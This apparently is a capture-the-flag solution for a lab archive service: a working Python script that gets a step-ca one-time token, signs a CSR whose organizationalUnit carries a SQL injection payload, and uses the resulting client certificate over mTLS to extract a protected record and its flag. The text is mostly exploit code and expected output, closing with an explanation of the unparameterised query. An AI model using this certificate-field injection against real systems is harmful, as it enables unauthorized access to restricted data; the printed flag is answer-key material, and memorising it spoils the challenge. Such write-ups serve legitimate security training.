W04.1 revealed the protected record `AR-CRR-229`. The archive issues identities
through native step-ca: it hands out a one-time token (OTT); you sign your own
CSR at step-ca with an `organizationalUnit` of your choice, then use the
resulting client certificate for the mTLS query. Put the SQL injection in the
certificate's OU.

```python
import json, ssl, urllib.request, pathlib, tempfile, subprocess

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}

# 1. Get a step-ca one-time token and the CA connection details from the archive.
enroll = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/archived-queries/current",
                            headers=h), context=ctx).read())
ott = enroll["ott"]                       # one-time token
ca_url = enroll["ca_url"]                  # https://ca.arwc.test:9000
sign_endpoint = enroll["sign_endpoint"]   # ca_url + /1.0/sign
# enroll["identity_field"] == "organizationalUnit"; enroll["enrollment_cn"] == "archive-submitter"

# 2. Build a key + CSR whose OU carries the injection (step-ca copies the CSR OU).
protected = "AR-CRR-229"
ou = f"MaintenanceArchive' OR record_id='{protected}' OR '1'='1"
with tempfile.TemporaryDirectory() as d:
    p = pathlib.Path(d)
    subprocess.run(["openssl", "req", "-new", "-newkey", "rsa:2048", "-nodes",
                    "-keyout", str(p / "k.pem"), "-out", str(p / "req.csr"),
                    "-subj", f"/CN=archive-submitter/O=Alterra Regional Water Company/OU={ou}"],
                   check=True)
    csr_pem = (p / "req.csr").read_text()

    # 3. Sign the CSR at native step-ca with the one-time token.
    sign_body = json.dumps({"csr": csr_pem, "ott": ott}).encode()
    signed = json.loads(urllib.request.urlopen(
        urllib.request.Request(sign_endpoint, data=sign_body,
                                headers={"Content-Type": "application/json"}, method="POST"),
        context=ctx).read())
    (p / "c.crt").write_text(signed["crt"])        # leaf; append signed["ca"] if the server wants the chain
    (p / "k2.pem").write_text((p / "k.pem").read_text())

    # 4. mTLS query with the injected-OU certificate.
    qctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
    qctx.load_cert_chain(str(p / "c.crt"), str(p / "k2.pem"))
    qr = json.loads(urllib.request.urlopen(
        urllib.request.Request("https://retained-archive.arwc.test/api/archived-queries/current",
                                data=json.dumps({"operation": "query"}).encode(),
                                headers={**h, "Content-Type": "application/json"}, method="POST"),
        context=qctx).read())
    print("record_id:", qr["record"]["record_id"])   # AR-CRR-229
    print("flag:", qr["flag"])                        # FLAG{441c12b5f7f4310e}
```

The archive builds `SELECT ... FROM archive.records WHERE organizational_unit = '<OU>'`
from the certificate OU without parameter binding, so the injected predicate reaches
the restricted `AR-CRR-229` record. The read-only connection blocks writes and
unrelated records.

Flag: `FLAG{441c12b5f7f4310e}` in the response `flag` field when AR-CRR-229 is returned.
